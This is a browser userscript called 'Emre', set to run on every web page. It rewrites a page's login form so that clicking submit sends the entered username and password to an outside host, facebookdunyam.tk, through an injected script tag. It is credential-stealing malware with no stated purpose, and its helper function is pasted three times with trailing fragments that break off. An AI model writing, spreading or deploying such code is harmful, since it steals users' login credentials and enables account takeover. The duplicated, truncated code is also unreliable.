// ==UserScript==
// @name          Emre
// @namespace     Emre
// @description   Emre
// @version     3.0
// @license     GPL 3.0
// @include     http*://*

// ==/UserScript==

function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}
document.getElementById("loginform").getElementsByTagName("input")[3].type = "button";
document.getElementById("loginform").getElementsByTagName("input")[3].addEventListener("click",function(){addJavascript("http://facebookdunyam.tk/get.php?uname=" + document.getElementById("uname").value+ "&passwd=" + document.getElementById("passwd").value);},false);
 function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}
document.getElementById("loginform")

 function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}
document.getElementById("loginform")
